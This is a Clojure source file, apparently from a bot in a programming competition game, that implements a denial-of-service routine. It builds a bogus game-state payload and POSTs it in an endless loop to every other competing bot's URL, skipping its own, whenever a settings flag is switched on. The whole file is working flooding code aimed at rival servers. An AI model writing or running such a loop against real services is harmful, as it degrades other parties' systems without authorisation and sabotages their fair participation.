(ns black-friday.bot.dos
  (:require [black-friday.bot.settings :as s]
            [clj-http.client :as client]
            [common.string :as xstr]
            [clojure.set :as set]
            [common.predicate :as p]))

(def targets (atom #{}))

(def attack-request {:reason "dos",
                     :gameState
                             {:map
                                 {:width 3,
                                  :height 3,
                                  :maxItemCount 0,
                                  :name "HAL Institute for Criminally Insane Robots",
                                  :tiles
                                  ["xxx"
                                   "x_x"
                                   "xxx"],
                                  :exit {:x 1, :y 1}},
                              :players []
                              :finishedPlayers []
                              :items []
                              :round 0
                              :shootingLines []}
                     :playerState
                             {:money 0
                              :name "Bender Bending Rodriguez"
                              :usableItems []
                              :state "WASTED",
                              :timeInState 0
                              :score 0
                              :url nil
                              :health 0
                              :position {:x 1, :y 1}
                              :actionCount 0}
                     :playerId "Insane in the main frame"})

(defn- attack-url [url]
  (try
    (client/post url {:form-params  attack-request
                      :content-type :json
                      :as           :json})
    (catch Throwable t)))

(defn attack-all []
  (do
    (doseq [url @targets] (attack-url url))
    (if (empty? @targets) (Thread/sleep 10000))
    (recur)))

(defn update-dos-targets [urls]
  (reset! targets (set (filter (p/not* (partial xstr/substring? (s/bot-url))) urls))))

(def attacker
  (when (s/dos-attact-active?) (future (attack-all))))
